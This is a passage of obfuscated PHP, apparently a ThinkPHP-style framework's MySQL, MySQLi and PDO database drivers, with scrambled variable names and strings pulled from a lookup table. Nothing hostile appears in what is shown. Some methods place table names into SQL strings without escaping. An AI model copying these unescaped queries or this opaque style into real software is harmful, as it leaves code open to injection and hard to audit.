($this->transTimes == 0) { mysql_query($_SERVER[Çâä∆◊¡][881], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $’ıâ±„ø = mysql_query($_SERVER[Çâä∆◊¡][882], $this->_linkID); $this->transTimes = 0; if (!$’ıâ±„ø) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $≤áíàíÅ = mysql_query($_SERVER[Çâä∆◊¡][883], $this->_linkID); $this->transTimes = 0; if (!$≤áíàíÅ) { $this->error(); return !1; } } return !0; } private function getAll() { $ÇäÒ–≥Ÿ = array(); if ($this->numRows > 0) { while ($öÅƒ∆™Ê = mysql_fetch_assoc($this->queryID)) { $ÇäÒ–≥Ÿ[] = $öÅƒ∆™Ê; } mysql_data_seek($this->queryID, 0); } return $ÇäÒ–≥Ÿ; } public function getFields($¶≈ëïÎ¸) { $•∆⁄µË• =& $_SERVER[Çâä∆◊¡]; $µÂ’›û« = $this->query($•∆⁄µË•[884] . $this->parseKey($¶≈ëïÎ¸)); $∂ßéú›≤ = array(); if ($µÂ’›û«) { foreach ($µÂ’›û« as $œ€ºº¡Ê => $â∞±Øé˚) { $∂ßéú›≤[$â∞±Øé˚[$•∆⁄µË•[31]]] = array($•∆⁄µË•[32] => $â∞±Øé˚[$•∆⁄µË•[31]], $•∆⁄µË•[33] => $â∞±Øé˚[$•∆⁄µË•[34]], $•∆⁄µË•[35] => (bool) (strtoupper($â∞±Øé˚[$•∆⁄µË•[36]]) === $•∆⁄µË•[885]), $•∆⁄µË•[37] => $â∞±Øé˚[$•∆⁄µË•[38]], $•∆⁄µË•[39] => strtolower($â∞±Øé˚[$•∆⁄µË•[40]]) == $•∆⁄µË•[41], $•∆⁄µË•[42] => strtolower($â∞±Øé˚[$•∆⁄µË•[43]]) == $•∆⁄µË•[44]); } } return $∂ßéú›≤; } public function getTables($¶≤›˝™ˆ = '') { $îò®®πÈ =& $_SERVER[Çâä∆◊¡]; if (!empty($¶≤›˝™ˆ)) { $Ù¥òä¥” = $îò®®πÈ[886] . $¶≤›˝™ˆ . $îò®®πÈ[887]; } else { $Ù¥òä¥” = $îò®®πÈ[888]; } $£ÒÆ»óñ = $this->query($Ù¥òä¥”); $†≠Û”ø™ = array(); foreach ($£ÒÆ»óñ as $âÆ˛öÆ© => $Ùß◊—àå) { $†≠Û”ø™[$âÆ˛öÆ©] = current($Ùß◊—àå); } return $†≠Û”ø™; } public function replace($Æ◊Ãç»‰, $Û˝¬ÙÚü = array()) { $±©ûÃÍ∫ =& $_SERVER[Çâä∆◊¡]; foreach ($Æ◊Ãç»‰ as $ì≥ı≤ã˙ => $ÁÒ•ú¨™) { $€ÛÓ˙Ã = $this->parseValue($ÁÒ•ú¨™); if (is_scalar($€ÛÓ˙Ã)) { $ìÃ“åØñ[] = $€ÛÓ˙Ã; $≠á⁄ıÖ™[] = $this->parseKey($ì≥ı≤ã˙); } } $ûÕî˚≠≤ = $±©ûÃÍ∫[889] . $this->parseTable($Û˝¬ÙÚü[$±©ûÃÍ∫[274]]) . $±©ûÃÍ∫[890] . implode($±©ûÃÍ∫[50], $≠á⁄ıÖ™) . $±©ûÃÍ∫[891] . implode($±©ûÃÍ∫[50], $ìÃ“åØñ) . $±©ûÃÍ∫[892]; return $this->execute($ûÕî˚≠≤); } public function insertAll($Òäÿ√Ÿ∂, $Úß§Ïçç = array(), $ˆ€ÔñÕ≈ = false) { $âª»ø•∏ =& $_SERVER[Çâä∆◊¡]; if (!is_array($Òäÿ√Ÿ∂[0])) { return !1; } $∑µË’‚¶ = array_keys($Òäÿ√Ÿ∂[0]); $Ò∞ì†∞“ = array(); foreach ($Òäÿ√Ÿ∂ as $†úìì˚ﬂ) { $Îºüë›Î = array(); foreach ($†úìì˚ﬂ as $À≈Ï¿∑« => $§√’“ﬁı) { $§√’“ﬁı = $this->parseValue($§√’“ﬁı); if (is_scalar($§√’“ﬁı)) { $Îºüë›Î[] = $§√’“ﬁı; } } $Ò∞ì†∞“[] = $âª»ø•∏[255] . implode($âª»ø•∏[50], $Îºüë›Î) . $âª»ø•∏[892]; } array_walk($∑µË’‚¶, array($this, $âª»ø•∏[893])); $·”Ò©◊ﬁ = ($ˆ€ÔñÕ≈ ? $âª»ø•∏[894] : $âª»ø•∏[895]) . $âª»ø•∏[896] . $this->parseTable($Úß§Ïçç[$âª»ø•∏[274]]) . $âª»ø•∏[890] . implode($âª»ø•∏[50], $∑µË’‚¶) . $âª»ø•∏[897] . implode($âª»ø•∏[50], $Ò∞ì†∞“); return $this->execute($·”Ò©◊ﬁ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $Ω—êÁ≤Û =& $_SERVER[Çâä∆◊¡]; $this->error = mysql_errno() . $Ω—êÁ≤Û[4] . mysql_error($this->_linkID); if ($Ω—êÁ≤Û[12] != $this->queryStr) { $this->error .= LNG($Ω—êÁ≤Û[48]) . $this->queryStr; } think_trace($this->error, $Ω—êÁ≤Û[12], $Ω—êÁ≤Û[49]); return $this->error; } public function escapeString($ÖôÎÃùÿ) { if ($this->_linkID) { return mysql_real_escape_string($ÖôÎÃùÿ, $this->_linkID); } else { return mysql_escape_string($ÖôÎÃùÿ); } } public function parseKey(&$ÔØÉ‚ûƒ, $¶Èô”™÷ = true) { $Ç”Òó◊Ö =& $_SERVER[Çâä∆◊¡]; if ($¶Èô”™÷) { $ÔØÉ‚ûƒ = $this->parseKeyCheck($ÔØÉ‚ûƒ); } if ($ÔØÉ‚ûƒ != $Ç”Òó◊Ö[181] && !preg_match($Ç”Òó◊Ö[898], $ÔØÉ‚ûƒ)) { $ÔØÉ‚ûƒ = $Ç”Òó◊Ö[380] . trim($ÔØÉ‚ûƒ, $Ç”Òó◊Ö[380]) . $Ç”Òó◊Ö[380]; } return $ÔØÉ‚ûƒ; } } class DbMysqli extends Db { public function __construct($Ë√¶ä¥Ç = '') { $øí›òÇ∑ =& $_SERVER[Çâä∆◊¡]; if (!extension_loaded($øí›òÇ∑[899])) { think_exception(think_lang($øí›òÇ∑[14]) . $øí›òÇ∑[900]); } if (!empty($Ë√¶ä¥Ç)) { $this->config = $Ë√¶ä¥Ç; if (empty($this->config[$øí›òÇ∑[17]])) { $this->config[$øí›òÇ∑[17]] = $øí›òÇ∑[12]; } } } public function connect($Ω¨∏œ®ä = '', $Üµ∆¿∑∑ = 0) { $˘‡óå¨à =& $_SERVER[Çâä∆◊¡]; if (!isset($this->linkID[$Üµ∆¿∑∑])) { if (empty($Ω¨∏œ®ä)) { $Ω¨∏œ®ä = $this->config; } $this->linkID[$Üµ∆¿∑∑] = new mysqli($Ω¨∏œ®ä[$˘‡óå¨à[873]], $Ω¨∏œ®ä[$˘‡óå¨à[875]], $Ω¨∏œ®ä[$˘‡óå¨à[876]], $Ω¨∏œ®ä[$˘‡óå¨à[21]], $Ω¨∏œ®ä[$˘‡óå¨à[874]] ? intval($Ω¨∏œ®ä[$˘‡óå¨à[874]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÌªáöÈË = $this->linkID[$Üµ∆¿∑∑]->server_version; $this->linkID[$Üµ∆¿∑∑]->query($˘‡óå¨à[877] . think_config($˘‡óå¨à[878]) . $˘‡óå¨à[58]); if ($ÌªáöÈË > $˘‡óå¨à[879]) { $this->linkID[$Üµ∆¿∑∑]->query($˘‡óå¨à[880]); } $this->connected = !0; if (1 != think_config($˘‡óå¨à[22])) { unset($this->config); } } return $this->linkID[$Üµ∆¿∑∑]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ó™Ñ‘¿æ) { $Ç˜™Ãéˆ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ó™Ñ‘¿æ; if ($this->queryID) { $this->free(); } think_action_status($Ç˜™Ãéˆ[23], 1); think_status($Ç˜™Ãéˆ[24]); $this->queryID = $this->_linkID->query($Ó™Ñ‘¿æ); if ($this->_linkID->more_results()) { while (($ó·ÛçØõ = $this->_linkID->next_result()) != NULL) { $ó·ÛçØõ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($óÿ„Ø£ö) { $π©Î€ÃÇ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $óÿ„Ø£ö; if ($this->queryID) { $this->free(); } think_action_status($π©Î€ÃÇ[25], 1); think_status($π©Î€ÃÇ[24]); $»Ùÿ˜Øí = $this->_linkID->query($óÿ„Ø£ö); $this->debug(); if (!1 === $»Ùÿ˜Øí) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $∆õ’¨ò’ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$∆õ’¨ò’) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $«´∂êŸ‰ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$«´∂êŸ‰) { $this->error(); return !1; } } return !0; } private function getAll() { $ΩŒ¬Öèﬁ = array(); if ($this->numRows > 0) { for ($óäÏé˚Ï = 0; $óäÏé˚Ï < $this->numRows; $óäÏé˚Ï++) { $ΩŒ¬Öèﬁ[$óäÏé˚Ï] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ΩŒ¬Öèﬁ; } public function getFields($È∂˙ÖØœ) { $‰¸ï⁄€ò =& $_SERVER[Çâä∆◊¡]; $˚ïﬂ¢∂º = $this->query($‰¸ï⁄€ò[884] . $this->parseKey($È∂˙ÖØœ)); $¨¸”ã˚∏ = array(); if ($˚ïﬂ¢∂º) { foreach ($˚ïﬂ¢∂º as $ùåÃ˙É« => $ô◊¡è∂Ö) { $¨¸”ã˚∏[$ô◊¡è∂Ö[$‰¸ï⁄€ò[31]]] = array($‰¸ï⁄€ò[32] => $ô◊¡è∂Ö[$‰¸ï⁄€ò[31]], $‰¸ï⁄€ò[33] => $ô◊¡è∂Ö[$‰¸ï⁄€ò[34]], $‰¸ï⁄€ò[35] => (bool) ($ô◊¡è∂Ö[$‰¸ï⁄€ò[36]] === $‰¸ï⁄€ò[12]), $‰¸ï⁄€ò[37] => $ô◊¡è∂Ö[$‰¸ï⁄€ò[38]], $‰¸ï⁄€ò[39] => strtolower($ô◊¡è∂Ö[$‰¸ï⁄€ò[40]]) == $‰¸ï⁄€ò[41], $‰¸ï⁄€ò[42] => strtolower($ô◊¡è∂Ö[$‰¸ï⁄€ò[43]]) == $‰¸ï⁄€ò[44]); } } return $¨¸”ã˚∏; } public function getTables($°Ü›¢±ë = '') { $£˘ËÙÇÎ =& $_SERVER[Çâä∆◊¡]; $§ñãñ¡ˆ = !empty($°Ü›¢±ë) ? $£˘ËÙÇÎ[886] . $°Ü›¢±ë . $£˘ËÙÇÎ[887] : $£˘ËÙÇÎ[888]; $—ïÌ‹ﬂ = $this->query($§ñãñ¡ˆ); $òƒÀœ±˝ = array(); if ($—ïÌ‹ﬂ) { foreach ($—ïÌ‹ﬂ as $¢ûﬂ»ô“ => $√ºäÉΩª) { $òƒÀœ±˝[$¢ûﬂ»ô“] = current($√ºäÉΩª); } } return $òƒÀœ±˝; } public function replace($–‚”›Œ›, $÷ó°¯Õì = array()) { $î’¨’ÿ¬ =& $_SERVER[Çâä∆◊¡]; foreach ($–‚”›Œ› as $∞ö∞Ãá => $•∞Â™˛Ÿ) { $©‘îŸ¢ˆ = $this->parseValue($•∞Â™˛Ÿ); if (is_scalar($©‘îŸ¢ˆ)) { $éî˘ò©≥[] = $©‘îŸ¢ˆ; $Œ•ÍÅ›¯[] = $this->parseKey($∞ö∞Ãá); } } $î®ÅŸØı = $î’¨’ÿ¬[889] . $this->parseTable($÷ó°¯Õì[$î’¨’ÿ¬[274]]) . $î’¨’ÿ¬[890] . implode($î’¨’ÿ¬[50], $Œ•ÍÅ›¯) . $î’¨’ÿ¬[891] . implode($î’¨’ÿ¬[50], $éî˘ò©≥) . $î’¨’ÿ¬[892]; return $this->execute($î®ÅŸØı); } public function insertAll($¶˜Â˝ä«, $õ¿ü°¬ì = array(), $·¢—¥‹£ = false) { $ïı∆∏ºÕ =& $_SERVER[Çâä∆◊¡]; if (!is_array($¶˜Â˝ä«[0])) { return !1; } $ﬂâ‚ÎÇî = array_keys($¶˜Â˝ä«[0]); $¸◊Å∏‘⁄ = array(); foreach ($¶˜Â˝ä« as $‰◊À¶ﬂ”) { $êÊ·ï¶¥ = array(); foreach ($‰◊À¶ﬂ” as $í≈‰˘Ñµ => $ÏÊõã¶±) { $ÏÊõã¶± = $this->parseValue($ÏÊõã¶±); if (is_scalar($ÏÊõã¶±)) { $êÊ·ï¶¥[] = $ÏÊõã¶±; } } $¸◊Å∏‘⁄[] = $ïı∆∏ºÕ[255] . implode($ïı∆∏ºÕ[50], $êÊ·ï¶¥) . $ïı∆∏ºÕ[892]; } array_walk($ﬂâ‚ÎÇî, array($this, $ïı∆∏ºÕ[893])); $ƒ—⁄õ´ﬂ = $·¢—¥‹£ ? $ïı∆∏ºÕ[894] : $ïı∆∏ºÕ[895]; $éâ¥¿˝Ÿ = $ƒ—⁄õ´ﬂ . $ïı∆∏ºÕ[896] . $this->parseTable($õ¿ü°¬ì[$ïı∆∏ºÕ[274]]) . $ïı∆∏ºÕ[890] . implode($ïı∆∏ºÕ[50], $ﬂâ‚ÎÇî) . $ïı∆∏ºÕ[897] . implode($ïı∆∏ºÕ[50], $¸◊Å∏‘⁄); return $this->execute($éâ¥¿˝Ÿ); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Ï∂ƒêıﬂ =& $_SERVER[Çâä∆◊¡]; $this->error = $this->_linkID->errno . $Ï∂ƒêıﬂ[4] . $this->_linkID->error; if ($Ï∂ƒêıﬂ[12] != $this->queryStr) { $this->error .= LNG($Ï∂ƒêıﬂ[48]) . $this->queryStr; } think_trace($this->error, $Ï∂ƒêıﬂ[12], $Ï∂ƒêıﬂ[49]); return $this->error; } public function escapeString($˜¶öŸè¬) { if ($this->_linkID) { return $this->_linkID->real_escape_string($˜¶öŸè¬); } else { return addslashes($˜¶öŸè¬); } } public function parseKey(&$’ƒ“âñﬁ, $øêıåÿÀ = true) { $â«ØäçË =& $_SERVER[Çâä∆◊¡]; if ($øêıåÿÀ) { $’ƒ“âñﬁ = $this->parseKeyCheck($’ƒ“âñﬁ); } if ($’ƒ“âñﬁ != $â«ØäçË[181] && !preg_match($â«ØäçË[898], $’ƒ“âñﬁ)) { $’ƒ“âñﬁ = $â«ØäçË[380] . trim($’ƒ“âñﬁ, $â«ØäçË[380]) . $â«ØäçË[380]; } return $’ƒ“âñﬁ; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($´ÌÓ˚˜£ = '') { $¯ãäïèΩ =& $_SERVER[Çâä∆◊¡]; if (!class_exists($¯ãäïèΩ[901])) { think_exception(think_lang($¯ãäïèΩ[14]) . $¯ãäïèΩ[902]); } if (!empty($´ÌÓ˚˜£)) { $this->config = $´ÌÓ˚˜£; if (empty($this->config[$¯ãäïèΩ[17]])) { $this->config[$¯ãäïèΩ[17]] = array(); } } } public function connect($•ªπÜﬁº = '', $ﬁΩ¬Àï§ = 0) { $ìÚïç®≥ =& $_SERVER[Çâä∆◊¡]; if (!isset($this->linkID[$ﬁΩ¬Àï§])) { if (empty($•ªπÜﬁº)) { $•ªπÜﬁº = $this->config; } $˜∑À√ëÕ = !empty($•ªπÜﬁº[$ìÚïç®≥[17]][$ìÚïç®≥[18]]) ? $•ªπÜﬁº[$ìÚïç®≥[17]][$ìÚïç®≥[18]] : $this->pconnect; if ($˜∑À√ëÕ) { $•ªπÜﬁº[$ìÚïç®≥[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ﬁΩ¬Àï§] = new PDO($•ªπÜﬁº[$ìÚïç®≥[903]], $•ªπÜﬁº[$ìÚïç®≥[875]], $•ªπÜﬁº[$ìÚïç®≥[876]], $•ªπÜﬁº[$ìÚïç®≥[17]]); } catch (PDOException $ÚìëˆÃ±) { think_exception($ÚìëˆÃ±->getMessage()); } $this->dbType = $this->_getDsnType($•ªπÜﬁº[$ìÚïç®≥[903]]); if (in_array($this->dbType, array($ìÚïç®≥[904], $ìÚïç®≥[905], $ìÚïç®≥[906], $ìÚïç®≥[907]))) { think_exception($ìÚïç®≥[908] . $this->dbType . $ìÚïç®≥[909] . $this->dbType . $ìÚïç®≥[910]); } if (!$this->linkID[$ﬁΩ¬Àï§]) { think_exception($ìÚïç®≥[911]); } try { $this->linkID[$ﬁΩ¬Àï§]->exec($ìÚïç®≥[912] . think_config($ìÚïç®≥[878])); } catch (Exception $ÚìëˆÃ±) { } $this->connected = !0; if (1 != think_config($ìÚïç®≥[22])) { unset($this->config); } } return $this->linkID[$ﬁΩ¬Àï§]; } public function free() { $this->PDOStatement = null; } public function query($˚áÌº≤‡, $‰ÿ›÷ö¨ = array()) { $≈Ô§‡Ä˚ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $˚áÌº≤‡; if (!empty($‰ÿ›÷ö¨)) { $this->queryStr .= $≈Ô§‡Ä˚[913] . print_r($‰ÿ›÷ö¨, !0) . $≈Ô§‡Ä˚[914]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($≈Ô§‡Ä˚[23], 1); think_status($≈Ô§‡Ä˚[24]); $this->PDOStatement = $this->_linkID->prepare($˚áÌº≤‡); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $∑˜ÛóÑõ = $this->PDOStatement->execute($‰ÿ›÷ö¨); $this->debug(); if (!1 === $∑˜ÛóÑõ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($—”‹èÙ≤, $©πÏ©Õ£ = array()) { $ÿÚêòêû =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $—”‹èÙ≤; if (!empty($©πÏ©Õ£)) { $this->queryStr .= $ÿÚêòêû[913] . print_r($©πÏ©Õ£, !0) . $ÿÚêòêû[914]; } $êçÊœÂç = !1; if ($this->dbType == $ÿÚêòêû[907]) { if (preg_match($ÿÚêòêû[915], $this->queryStr, $çˆ´˛Û)) { $this->table = think_config($ÿÚêòêû[916]) . str_ireplace(think_config($ÿÚêòêû[917]), $ÿÚêòêû[373], $çˆ´˛Û[2]); $êçÊœÂç = (bool) $this->query($ÿÚêòêû[918] . strtoupper($this->table) . $ÿÚêòêû[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÿÚêòêû[25], 1); think_status($ÿÚêòêû[24]); $this->PDOStatement = $this->_linkID->prepare($—”‹èÙ≤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $“ı€Áﬂπ = $this->PDOStatement->execute($©πÏ©Õ£); $this->debug(); if (!1 === $“ı€Áﬂπ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($êçÊœÂç || preg_match($ÿÚêòêû[919], $—”‹èÙ≤)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $‰ø“ò÷Ë = $this->_linkID->commit(); $this->transTimes = 0; if (!$‰ø“ò÷Ë) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ñÕòö“Ê = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ñÕòö“Ê) { $this->error(); return !1; } } return !0; } private function getAll() { $Æ¸∏∆Æç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($Æ¸∏∆Æç); return $Æ¸∏∆Æç; } public function getFields($∂Áö†≤ ) { $¢∞Ï’ÍÏ =& $_SERVER[Çâä∆◊¡]; $this->initConnect(!0); if (think_config($¢∞Ï’ÍÏ[920])) { $ŒŒ˜™ßä = str_replace($¢∞Ï’ÍÏ[921], $∂Áö†≤ , think_config($¢∞Ï’ÍÏ[920])); } else { switch ($this->dbType) { case $¢∞Ï’ÍÏ[904]: case $¢∞Ï’ÍÏ[922]: $ŒŒ˜™ßä = "\123\x45\114\105\x43\x54\40\x20\x20\x63\157\154\165\155\x6e\137\x6e\x61\155\145\x20\141\163\x20\x27\116\x61\155\x65\47\x2c\40\40\40\144\x61\164\141\137\x74\171\160\145\40\141\163\x20\x27\x54\171\160\x65\47\54\40\x20\x20\143\157\x6c\165\x6d\156\x5f\x64\x65\146\x61\165\x6c\x74\40\x61\163\x20\x27\x44\145\x66\x61\165\x6c\x74\47\x2c\x20\x20\40\x69\x73\137\x6e\x75\x6c\154\x61\142\154\x65\x20\141\163\40\47\x4e\165\154\x6c\x27\12\11\11\106\122\x4f\115\11\151\156\x66\x6f\162\155\x61\x74\151\x6f\156\x5f\x73\143\150\x65\x6d\141\x2e\x74\x61\142\x6c\x65\x73\x20\x41\123\x20\164\xa\x9\11\x4a\x4f\111\x4e\11\151\x6e\146\157\x72\x6d\x61\164\x69\x6f\x6e\137\x73\x63\150\x65\x6d\141\x2e\x63\x6f\154\165\x6d\156\163\x20\101\x53\40\x63\xa\11\11\117\x4e\x20\x20\164\56\x74\x61\142\154\145\x5f\x63\x61\x74\141\x6c\157\x67\x20\75\40\x63\x2e\164\141\x62\x6c\145\x5f\143\x61\x74\x61\x6c\x6f\147\xa\11\x9\x41\x4e\104\40\164\56\x74\141\142\154\x65\x5f\163\x63\x68\145\155\141\x20\75\40\143\56\164\x61\142\x6c\x65\x5f\x73\143\150\x65\x6d\x61\12\x9\x9\x41\x4e\x44\x20\x74\56\164\141\142\154\145\137\x6e\x61\x6d\x65\x20\x3d\x20\143\x2e\x74\141\x62\x6c\145\x5f\x6e\x61\x6d\145\12\x9\x9\127\110\x45\x52\x45\x20\x20\x20\x74\x2e\164\x61\x62\154\145\x5f\156\141\155\x65\x20\75\40\x27{$∂Áö†≤ }\47"; break; case $¢∞Ï’ÍÏ[923]: $ŒŒ˜™ßä = $¢∞Ï’ÍÏ[924] . $∂Áö†≤  . $¢∞Ï’ÍÏ[925]; break; case $¢∞Ï’ÍÏ[905]: case $¢∞Ï’ÍÏ[907]: $ŒŒ˜™ßä = $¢∞Ï’ÍÏ[926] . $¢∞Ï’ÍÏ[927] . $¢∞Ï’ÍÏ[928] . strtoupper($∂Áö†≤ ) . $¢∞Ï’ÍÏ[929] . strtoupper($∂Áö†≤ ) . $¢∞Ï’ÍÏ[930]; break; case $¢∞Ï’ÍÏ[931]: $ŒŒ˜™ßä = $¢∞Ï’ÍÏ[932] . $∂Áö†≤  . $¢∞Ï’ÍÏ[933]; break; case $¢∞Ï’ÍÏ[906]: break; case $¢∞Ï’ÍÏ[934]: default: $ŒŒ˜™ßä = $¢∞Ï’ÍÏ[935] . ($this->dbType == $¢∞Ï’ÍÏ[934] ? "\140{$∂Áö†≤ }\x60" : $∂Áö†≤ ); } } $Á¥Ê˛∑ä = $this->query($ŒŒ˜™ßä); $®¸´÷¨ó = array(); if ($Á¥Ê˛∑ä) { foreach ($Á¥Ê˛∑ä as $∫‡•∫ƒå => $Œ«±¨ÀÑ) { $Œ«±¨ÀÑ = array_change_key_case($Œ«±¨ÀÑ); $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[32]] = isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[32]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[32]] : $¢∞Ï’ÍÏ[373]; $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[33]] = isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[33]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[33]] : $¢∞Ï’ÍÏ[373]; $¨Ôµúﬁü = isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[268]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[268]] : $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[32]]; $®¸´÷¨ó[$¨Ôµúﬁü] = array($¢∞Ï’ÍÏ[32] => $¨Ôµúﬁü, $¢∞Ï’ÍÏ[33] => $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[33]], $¢∞Ï’ÍÏ[35] => (bool) (isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[104]]) && $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[104]] === $¢∞Ï’ÍÏ[12] || isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[35]]) && $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[35]] === $¢∞Ï’ÍÏ[12]), $¢∞Ï’ÍÏ[37] => isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[37]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[37]] : (isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[56]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[56]] : $¢∞Ï’ÍÏ[373]), $¢∞Ï’ÍÏ[39] => isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[95]]) ? strtolower($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[95]]) == $¢∞Ï’ÍÏ[41] : (isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[57]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[57]] : !1), $¢∞Ï’ÍÏ[42] => isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[936]]) ? strtolower($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[936]]) == $¢∞Ï’ÍÏ[44] : (isset($Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[95]]) ? $Œ«±¨ÀÑ[$¢∞Ï’ÍÏ[95]] : !1)); } } return $®¸´÷¨ó; } public function getTables($œ√˛Ï≤… = '') { $˛©⁄œ⁄≠ =& $_SERVER[Çâä∆◊¡]; if (think_config($˛©⁄œ⁄≠[937])) { $·–«Ë…◊ = str_replace($˛©⁄œ⁄≠[938], $œ√˛Ï≤…, think_config($˛©⁄œ⁄≠[937])); } else { switch ($this->dbType) { case $˛©⁄œ⁄≠[905]: case $˛©⁄œ⁄≠[907]: $·–«Ë…◊ = $˛©⁄œ⁄≠[939]; break; case $˛©⁄œ⁄≠[904]: case $˛©⁄œ⁄≠[922]: $·–«Ë…◊ = $˛©⁄œ⁄≠[940]; break; case $˛©⁄œ⁄≠[931]: $·–«Ë…◊ = $˛©⁄œ⁄≠[941]; break; case $˛©⁄œ⁄≠[906]: think_exception(think_lang($˛©⁄œ⁄≠[942]) . $˛©⁄œ⁄≠[943]); break; case $˛©⁄œ⁄≠[923]: $·–«Ë…◊ = $˛©⁄œ⁄≠[45] . $˛©⁄œ⁄≠[46] . $˛©⁄œ⁄≠[47]; break; case $˛©⁄œ⁄≠[934]: default: if (!empty($œ√˛Ï≤…)) { $·–«Ë…◊ = $˛©⁄œ⁄≠[886] . $œ√˛Ï≤… . $˛©⁄œ⁄≠[887]; } else { $·–«Ë…◊ = $˛©⁄œ⁄≠[888]; } } } $ñﬁ≤°ø¸ = $this->query($·–«Ë…◊); $œºØ’˜Ê = array(); foreach ($ñﬁ≤°ø¸ as $ˆ≥íõ›ª => $€ŒæÄÛÕ) { $œºØ’˜Ê[$ˆ≥íõ›ª] = current($€ŒæÄÛÕ); } return $œºØ’˜Ê; } protected function parseLimit($•⁄ﬁØé∑) { $Ø£Ã“˜≤ =& $_SERVER[Çâä∆◊¡]; $Ü±Ö‡∆π = $Ø£Ã“˜≤[12]; if (!empty($•⁄ﬁØé∑)) { switch ($this->dbType) { case $Ø£Ã“˜≤[931]: case $Ø£Ã“˜≤[923]: $•⁄ﬁØé∑ = explode($Ø£Ã“˜≤[50], $•⁄ﬁØé∑); if (count($•⁄ﬁØé∑) > 1) { $Ü±Ö‡∆π .= $Ø£Ã“˜≤[51] . $•⁄ﬁØé∑[1] . $Ø£Ã“˜≤[52] . $•⁄ﬁØé∑[0] . $Ø£Ã“˜≤[53]; } else { $Ü±Ö‡∆π .= $Ø£Ã“˜≤[51] . $•⁄ﬁØé∑[0] . $Ø£Ã“˜≤[53]; } break; case $Ø£Ã“˜≤[904]: case $Ø£Ã“˜≤[922]: break; case $Ø£Ã“˜≤[906]: break; case $Ø£Ã“˜≤[905]: case $Ø£Ã“˜≤[907]: break; case $Ø£Ã“˜≤[934]: default: $Ü±Ö‡∆π .= $Ø£Ã“˜≤[51] . $•⁄ﬁØé∑ . $Ø£Ã“˜≤[53]; } } return $Ü±Ö‡∆π; } public function parseKey(&$ò·î≈‘Ÿ, $∆ÌåÚ®Ü = true) { $‰ùüΩñÒ =& $_SERVER[Çâä∆◊¡]; if ($∆ÌåÚ®Ü) { $ò·î≈‘Ÿ = $this->parseKeyCheck($ò·î≈‘Ÿ); } if ($this->dbType == $‰ùüΩñÒ[934]) { if ($ò·î≈‘Ÿ != $‰ùüΩñÒ[181] && !preg_match($‰ùüΩñÒ[898], $ò·î≈‘Ÿ)) { $ò·î≈‘Ÿ = $‰ùüΩñÒ[380] . trim($ò·î≈‘Ÿ, $‰ùüΩñÒ[380]) . $‰ùüΩñÒ[380]; } return $ò·î≈‘Ÿ; } else { return parent::parseKey($ò·î≈‘Ÿ, 